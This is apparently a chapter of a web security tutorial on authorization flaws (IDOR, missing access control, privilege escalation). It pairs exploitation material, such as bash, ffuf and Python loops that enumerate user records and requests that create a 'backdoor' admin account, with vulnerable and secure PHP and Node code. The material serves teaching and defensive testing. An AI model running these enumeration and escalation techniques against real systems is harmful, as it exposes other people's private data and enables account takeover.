# 1. AUTHORIZATION VULNERABILITIES <a name="authorization"></a>

## 1.1 THEORY & COMMON PITFALLS

### What is Authorization?

**Authentication** = "Who are you?" (proving identity)
**Authorization** = "What can you do?" (permissions/access control)

### Common Authorization Pitfalls

**1. Insecure Direct Object References (IDOR)**
**2. Missing Function-Level Access Control**
**3. Missing Object-Level Access Control**
**4. Path Traversal in Authorization**
**5. Horizontal Privilege Escalation**
**6. Vertical Privilege Escalation**
**7. Role-Based Access Control Bypass**

---

## 1.2 INSECURE DIRECT OBJECT REFERENCES (IDOR)

### 1.2.1 Theory

**IDOR** occurs when an application exposes a reference to an internal object (database record, file, etc.) without proper authorization checks.

**Example Vulnerable URL:**
```
http://bank.com/account?id=12345
```

If user can change `id=12345` to `id=12346` and view another user's account → IDOR vulnerability

### 1.2.2 Identification & Exploitation

**Numeric IDORs:**

```bash
# Original request (your account):
GET /api/user/1234 HTTP/1.1
Host: vulnerable-site.com
Cookie: session=abc123

# Response:
{
  "id": 1234,
  "name": "John Doe",
  "email": "john@example.com",
  "ssn": "123-45-6789"
}

# Test IDOR:
GET /api/user/1235 HTTP/1.1
Host: vulnerable-site.com
Cookie: session=abc123

# If you get another user's data → IDOR!

# Enumerate all users:
for i in {1..10000}; do
    curl -s -H "Cookie: session=abc123" \
        "http://vulnerable-site.com/api/user/$i" >> users.json
done
```

**GUID/UUID IDORs:**

```bash
# Even with GUIDs, still vulnerable if no authorization check

GET /api/document/a7f3e9b2-4c8d-11ec-81d3-0242ac130003 HTTP/1.1

# Find GUIDs in:
# - Other API responses
# - HTML source code
# - JavaScript files
# - Error messages
# - Email notifications
# - Public documents

# Then access:
GET /api/document/FOUND_UUID HTTP/1.1
```

**Encoded IDORs:**

```bash
# Base64 encoded
GET /download?file=dXNlcl8xMjM0X2RvYy5wZGY= HTTP/1.1
# Decodes to: user_1234_doc.pdf

# Try:
echo "user_1235_doc.pdf" | base64
# Result: dXNlcl8xMjM1X2RvYy5wZGY=

GET /download?file=dXNlcl8xMjM1X2RvYy5wZGY= HTTP/1.1

# Hashed IDs (if predictable)
GET /invoice/a1b2c3d4 HTTP/1.1
# If hash is MD5 of sequential number, can predict
```

**Real-World IDOR Examples:**

```bash
# Example 1: View another user's profile
GET /profile?user_id=500 HTTP/1.1
# Change to user_id=501

# Example 2: Edit another user's data
POST /api/user/update HTTP/1.1
Content-Type: application/json

{"user_id": 500, "email": "newemail@test.com"}
# Change user_id to 501

# Example 3: Delete another user's resource
DELETE /api/post/123 HTTP/1.1
# Change to post/124 (another user's post)

# Example 4: View private documents
GET /document/download?doc_id=ABC123 HTTP/1.1
# Change to doc_id=ABC124

# Example 5: Access admin functions
GET /admin/users?id=1 HTTP/1.1
# Even if logged in as regular user

# Example 6: View order details
GET /order/details?order_id=1000 HTTP/1.1
# Change to order_id=1001

# Example 7: Download invoice
GET /invoices/2023/invoice_12345.pdf HTTP/1.1
# Change to invoice_12346.pdf
```

**Automated IDOR Testing:**

```bash
# Using Burp Suite Intruder:
# 1. Capture request with ID parameter
# 2. Send to Intruder
# 1. Mark ID as payload position
# 4. Set payload type: Numbers (1-10000)
# 5. Start attack
# 6. Look for different response lengths/status codes

# Using FFUF:
ffuf -w <(seq 1 10000) -u http://site.com/api/user/FUZZ \
     -H "Cookie: session=abc123" \
     -mc 200

# Using custom Python script:
import requests

session = requests.Session()
session.cookies.set('session', 'abc123')

for user_id in range(1, 10001):
    r = session.get(f'http://site.com/api/user/{user_id}')
    if r.status_code == 200:
        print(f"[+] User {user_id}: {r.json()}")
```

### 1.2.3 Prevention

```php
// VULNERABLE CODE:
$user_id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $user_id";
// No check if current user can access this ID!

// SECURE CODE:
session_start();
$requested_user_id = $_GET['id'];
$current_user_id = $_SESSION['user_id'];

// Check authorization
if ($requested_user_id != $current_user_id) {
    // Check if user has permission (e.g., admin)
    if ($_SESSION['role'] != 'admin') {
        http_response_code(403);
        die('Unauthorized');
    }
}

// Now safe to query
$query = "SELECT * FROM users WHERE id = ?";
$stmt = $pdo->prepare($query);
$stmt->execute([$requested_user_id]);
```

```javascript
// Node.js/Express - Secure authorization check
app.get('/api/user/:id', isAuthenticated, (req, res) => {
    const requestedId = req.params.id;
    const currentUserId = req.session.userId;
    const userRole = req.session.role;
    
    // Authorization check
    if (requestedId !== currentUserId && userRole !== 'admin') {
        return res.status(403).send('Unauthorized');
    }
    
    // Fetch user data
    db.getUser(requestedId, (err, user) => {
        if (err) return res.status(500).send('Error');
        res.json(user);
    });
});
```

---

## 1.3 MISSING FUNCTION-LEVEL ACCESS CONTROL

### 1.3.1 Theory

Application fails to verify user permissions before executing privileged functions.

**Example:**
- Regular user can access admin functions
- User can perform actions meant for different role
- Functions protected by obscurity, not authorization

### 1.3.2 Exploitation

```bash
# Scenario: Admin panel accessible to regular users

# Discover admin endpoints:
# - Check JavaScript files for API endpoints
# - Check robots.txt
# - Fuzz for admin paths
# - Check HTML comments

# Common admin paths:
/admin
/administrator
/admin.php
/admin/users
/admin/settings
/api/admin/users
/management
/console

# Test access as regular user:
curl -H "Cookie: session=regular_user_session" \
     http://site.com/admin/users

# If 200 OK → Missing access control!

# Example exploits:
# 1. Create admin user:
POST /admin/create-user HTTP/1.1
Cookie: session=regular_user_session
Content-Type: application/json

{"username": "backdoor", "password": "pass", "role": "admin"}

# 2. Delete users:
DELETE /admin/user/123 HTTP/1.1
Cookie: session=regular_user_session

# 1. Change system settings:
POST /admin/settings HTTP/1.1
Cookie: session=regular_user_session
Content-Type: application/json

{"maintenance_mode": true}

# 4. View all orders (instead of just yours):
GET /api/orders/all HTTP/1.1
Cookie: session=regular_user_session
```

**Hidden Parameters:**

```bash
# Application may check for special parameter

# Regular request:
GET /profile HTTP/1.1
Cookie: session=user_session

# Try adding admin parameter:
GET /profile?admin=true HTTP/1.1
GET /profile?role=admin HTTP/1.1
GET /profile?debug=true HTTP/1.1
GET /profile?isAdmin=1 HTTP/1.1

# In POST body:
POST /api/action HTTP/1.1
Content-Type: application/json

{"action": "delete", "admin": true}
{"action": "delete", "role": "administrator"}
```

### 1.3.3 Prevention

```php
// VULNERABLE:
function deleteUser($user_id) {
    // No permission check!
    $query = "DELETE FROM users WHERE id = ?";
    $stmt = $pdo->prepare($query);
    $stmt->execute([$user_id]);
}

// SECURE:
function deleteUser($user_id, $current_user_role) {
    // Check permissions
    if ($current_user_role !== 'admin') {
        throw new Exception('Unauthorized');
    }
    
    $query = "DELETE FROM users WHERE id = ?";
    $stmt = $pdo->prepare($query);
    $stmt->execute([$user_id]);
}

// Usage:
session_start();
if ($_SESSION['role'] !== 'admin') {
    http_response_code(403);
    die('Forbidden');
}
deleteUser($_POST['user_id'], $_SESSION['role']);
```

---

## 1.4 HORIZONTAL & VERTICAL PRIVILEGE ESCALATION

### 1.4.1 Horizontal Privilege Escalation

**Definition:** User A accesses User B's resources (same privilege level)

**Examples:**

```bash
# User A's request:
GET /messages?user=alice HTTP/1.1

# User A changes parameter to User B:
GET /messages?user=bob HTTP/1.1
# If successful → Horizontal escalation

# Other examples:
GET /api/transactions?account=123456 HTTP/1.1
# Change to: account=123457 (another user's account)

POST /update-profile HTTP/1.1
{"user_id": 500, "email": "new@email.com"}
# Change user_id to 501

GET /download-invoice?invoice_id=1000&user_id=50 HTTP/1.1
# Change user_id to 51
```

### 1.4.2 Vertical Privilege Escalation

**Definition:** Lower-privileged user accesses higher-privileged functions

**Examples:**

```bash
# Regular user → Admin access

# Method 1: Parameter manipulation
POST /admin/create-user HTTP/1.1
Cookie: regular_user_session
{"username": "test", "role": "user"}

# Try changing role:
{"username": "test", "role": "admin"}

# Method 2: Mass assignment
POST /register HTTP/1.1
{"username": "newuser", "password": "pass"}

# Try adding role:
{"username": "newuser", "password": "pass", "role": "admin"}
{"username": "newuser", "password": "pass", "isAdmin": true}

# Method 3: Cookie manipulation
Cookie: user_id=123; role=user

# Change to:
Cookie: user_id=123; role=admin

# Method 4: Hidden form fields
<form method="POST" action="/update">
    <input type="hidden" name="role" value="user">
    <input type="text" name="email">
    <input type="submit">
</form>

# Intercept with Burp, change role to admin

# Method 5: API parameter injection
PUT /api/profile HTTP/1.1
{"email": "new@email.com"}

# Add privilege field:
{"email": "new@email.com", "privilege": 15}
{"email": "new@email.com", "is_admin": true}
```

**Testing for Privilege Escalation:**

```python
# Python script to test privilege escalation
import requests

# Login as regular user
session = requests.Session()
session.post('http://site.com/login', data={
    'username': 'regular_user',
    'password': 'password'
})

# Try admin functions
admin_endpoints = [
    '/admin/users',
    '/admin/settings',
    '/api/admin/delete-user',
    '/api/admin/system-config',
    '/management/users'
]

for endpoint in admin_endpoints:
    r = session.get(f'http://site.com{endpoint}')
    if r.status_code == 200:
        print(f'[!] Privilege escalation found: {endpoint}')
    else:
        print(f'[-] Blocked: {endpoint} ({r.status_code})')

# Try parameter manipulation
r = session.post('http://site.com/api/update-profile', json={
    'email': 'test@test.com',
    'role': 'admin'
})

if 'admin' in r.text or r.status_code == 200:
    print('[!] Possible mass assignment vulnerability')
```

---
